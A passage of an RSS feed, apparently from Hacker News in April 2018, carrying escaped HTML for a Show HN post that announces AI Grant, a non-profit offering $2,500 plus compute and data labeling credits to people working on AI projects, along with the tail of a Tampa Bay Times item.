&lt;p class=&quot;read-more-graf&quot;&gt;This real-life game of Grand Theft Auto is dangerous. It’s spreading. And we’re part of the problem.&lt;/p&gt;


&lt;h4 class=&quot;read-more-head&quot;&gt;The Girl in the Window&lt;/h4&gt;
&lt;p class=&quot;read-more-graf&quot;&gt;She had never seen a doctor, never been to school. She couldn’t speak or feed herself. Authorities had discovered the rarest of creatures: a feral child.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;

</description>
<pubDate>Thu, 05 Apr 2018 02:41:46 +0000</pubDate>
<dc:creator>Avshalom</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.tampabay.com/projects/2018/features/baby-diaper-cost/</dc:identifier>
</item>
<item>
<title>Show HN: AI Grant – Get $2,500 for your AI project in minutes</title>
<link>https://news.ycombinator.com/item?id=16760736</link>
<guid isPermaLink="true" >https://news.ycombinator.com/item?id=16760736</guid>
<description>&lt;tr readability=&quot;0.55737704918033&quot;&gt;&lt;td bgcolor=&quot;#FF6600&quot;&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td/&gt;
&lt;/tr&gt;&lt;tr readability=&quot;12.22015503876&quot;&gt;&lt;td&gt;
&lt;table class=&quot;fatitem&quot; border=&quot;0&quot; readability=&quot;7.8558139534884&quot;&gt;&lt;tr class=&quot;athing&quot; id=&quot;16760736&quot; readability=&quot;0&quot;&gt;&lt;td align=&quot;right&quot; valign=&quot;top&quot; class=&quot;title&quot;/&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;title&quot;&gt;&lt;a href=&quot;https://news.ycombinator.com/item?id=16760736&quot; class=&quot;storylink&quot;&gt;Show HN: AI Grant – Get $2,500 for your AI project in minutes&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;0.71428571428571&quot;&gt;&lt;td colspan=&quot;2&quot;/&gt;
&lt;td class=&quot;subtext&quot;&gt;&lt;span class=&quot;score&quot; id=&quot;score_16760736&quot;&gt;315 points&lt;/span&gt; by &lt;a href=&quot;https://news.ycombinator.com/user?id=danicgross&quot; class=&quot;hnuser&quot;&gt;danicgross&lt;/a&gt; &lt;span class=&quot;age&quot;&gt;&lt;a href=&quot;https://news.ycombinator.com/item?id=16760736&quot;&gt;23 hours ago&lt;/a&gt;&lt;/span&gt; &lt;span id=&quot;unv_16760736&quot;/&gt; | &lt;a href=&quot;https://news.ycombinator.com/hide?id=16760736&amp;amp;goto=item%3Fid%3D16760736&quot;&gt;hide&lt;/a&gt; | &lt;a href=&quot;https://hn.algolia.com/?query=Show%20HN%3A%20AI%20Grant%20%E2%80%93%20Get%20%242%2C500%20for%20your%20AI%20project%20in%20minutes&amp;amp;sort=byDate&amp;amp;dateRange=all&amp;amp;type=story&amp;amp;storyText=false&amp;amp;prefix&amp;amp;page=0&quot; class=&quot;hnpast&quot;&gt;past&lt;/a&gt; | &lt;a href=&quot;https://www.google.com/search?q=Show%20HN%3A%20AI%20Grant%20%E2%80%93%20Get%20%242%2C500%20for%20your%20AI%20project%20in%20minutes&quot;&gt;web&lt;/a&gt; | &lt;a href=&quot;https://news.ycombinator.com/fave?id=16760736&amp;amp;auth=883fa3a0669cb4607170cd0f5d2ec4391517c7de&quot;&gt;favorite&lt;/a&gt; | &lt;a href=&quot;https://news.ycombinator.com/item?id=16760736&quot;&gt;156 comments&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td/&gt;
&lt;/tr&gt;&lt;tr readability=&quot;20.614373356705&quot;&gt;&lt;td colspan=&quot;2&quot;/&gt;
&lt;td readability=&quot;19.176161262051&quot;&gt;Hi HN,
&lt;p&gt;Last year, we launched a non-profit AI research lab called AI Grant (&lt;a href=&quot;http://aigrant.org&quot; rel=&quot;nofollow&quot;&gt;http://aigrant.org&lt;/a&gt;). Our goal is to fund promising people around the world working on AI. No strings attached. We've since given away over $100,000 to 30 teams working on different projects. You can see some of them here: &lt;a href=&quot;http://aigrant.org/#finalists&quot; rel=&quot;nofollow&quot;&gt;http://aigrant.org/#finalists&lt;/a&gt;. We just started accepting applications for our third batch!&lt;/p&gt;
&lt;p&gt;The academic grant application process is burdensome. It's only avalible to a choice few. Applications take days to complete.&lt;/p&gt;
&lt;p&gt;AI Grant is open to anyone on the internet. You can apply in under an hour. Fellows get:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;  - $2,500 in cash.
  - $20,000 each in Google Compute Engine credits.
  - $5k in CrowdFlower data labeling credits.
  - ScaleAPI data labeling credits.
  - Access to the network of other Fellows
&lt;/code&gt;
&lt;/pre&gt;
Our long term goal is to build an online community of people working on interesting side-projects in AI, supporting each other. We've built some infrastructure around this (chatrooms, group video conferences). We'll continue to expand this over time. I'd be very curious to know what HN thinks about this idea, and how we might make it better. Thanks!&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td/&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td colspan=&quot;2&quot;/&gt;
&lt;td&gt;

&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;1&quot;&gt;&lt;td&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;10&quot; width=&quot;0&quot;/&gt;&lt;br/&gt;&lt;center&gt;&lt;span class=&quot;yclinks&quot;&gt;&lt;a href=&quot;https://news.ycombinator.com/newsguidelines.html&quot;&gt;Guidelines&lt;/a&gt; | &lt;a href=&quot;https://news.ycombinator.com/newsfaq.html&quot;&gt;FAQ&lt;/a&gt; | &lt;a href=&quot;mailto:hn@ycombinator.com&quot;&gt;Support&lt;/a&gt; | &lt;a href=&quot;https://github.com/HackerNews/API&quot;&gt;API&lt;/a&gt; | &lt;a href=&quot;https://news.ycombinator.com/security.html&quot;&gt;Security&lt;/a&gt; | &lt;a href=&quot;https://news.ycombinator.com/lists&quot;&gt;Lists&lt;/a&gt; | &lt;a href=&quot;https://news.ycombinator.com/bookmarklet.html&quot; rel=&quot;nofollow&quot;&gt;Bookmarklet&lt;/a&gt; | &lt;a href=&quot;http://www.ycombinator.com/legal/&quot;&gt;Legal&lt;/a&gt; | &lt;a href=&quot;http://www.ycombinator.com/apply/&quot;&gt;Apply to YC&lt;/a&gt; | &lt;a href=&quot;mailto:hn@ycombinator.com&quot;&gt;Contact&lt;/a&gt;&lt;/span&gt;
&lt;/center&gt;
&lt;/td&gt;
&lt;/tr&gt;</description>
<pubDate>Thu, 05 Apr 2018 00:39:02 +0000</pubDate>
<dc:creator>danicgross</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://news.ycombinator.com/item?id=16760736</dc:identifier>
</item>
</channel>
</rss>